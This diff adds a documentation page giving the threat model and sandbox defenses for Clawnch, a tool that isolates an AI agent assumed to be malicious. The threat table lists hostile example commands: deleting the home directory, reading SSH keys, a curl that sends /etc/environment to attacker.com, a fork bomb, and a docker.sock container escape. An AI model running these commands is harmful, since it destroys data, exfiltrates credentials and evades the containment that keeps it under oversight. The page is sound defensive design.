@@ -1,0 +1,46 @@
+---
+title: Security Model & Threat Analysis
+description: Threat model, defense layers, and trust boundaries
+---
+
+## Threat Model
+
+Clawnch assumes the AI agent (or code it executes) is **untrusted and potentially malicious**.
+
+| Threat | Example | Mitigation |
+|---|---|---|
+| Filesystem access | `rm -rf ~`, `cat ~/.ssh/id_rsa` | Container mounts only the workspace |
+| Credential exfiltration | `curl -d @/etc/environment attacker.com` | Credentials injected as env vars only |
+| Network pivot | `ssh internal-server` | Default-isolated network |
+| Docker escape | Mount `/var/run/docker.sock` | Socket never mounted |
+| Resource exhaustion | `:(){ :\|:& };:` | Container resource limits (future) |
+| Supply chain | Malicious npm/pip package | Read-only system filesystem (future) |
+
+## Defense Layers
+
+**Layer 1 — CLI Guardrails:** Validate workspace path (reject `/`, `/etc`, `/home`, `~/.ssh`), warn if running as root.
+
+**Layer 2 — Container Isolation:** `--cap-drop ALL`, `--security-opt no-new-privileges:true`, `--network isolated`, no `--privileged`, no `--device`, no `--pid=host`.
+
+**Layer 3 — Credential Protection:** Keys injected via pipes or temp files (0600, auto-deleted), no keychain access from inside the container.
+
+**Layer 4 — Network Controls:** Default-deny outbound traffic, allow-list only for known endpoints, cloud metadata endpoint blocked by default.
+
+**Layer 5 — MicroVM (future):** Separate kernel means container escape ≠ host compromise.
+
+## Trust Boundaries
+
+- **Docker is trusted.** A compromised Docker daemon bypasses all container-level isolation.
+- **The system keychain is trusted.**
+- **The agent image is trusted.** Built from pinned base images with checksum verification.
+- **The host kernel is trusted.** Container isolation relies on namespace implementation.
+
+## Security-Sensitive Operations
+
+These require explicit user confirmation (future: `--dangerously-skip-permissions` flag):
+
+- Running in `--network host` mode
+- Mounting additional host directories
+- Running as root inside the sandbox
+- Disabling `--cap-drop ALL`
+- Using `--no-creds` with an agent requiring credentials
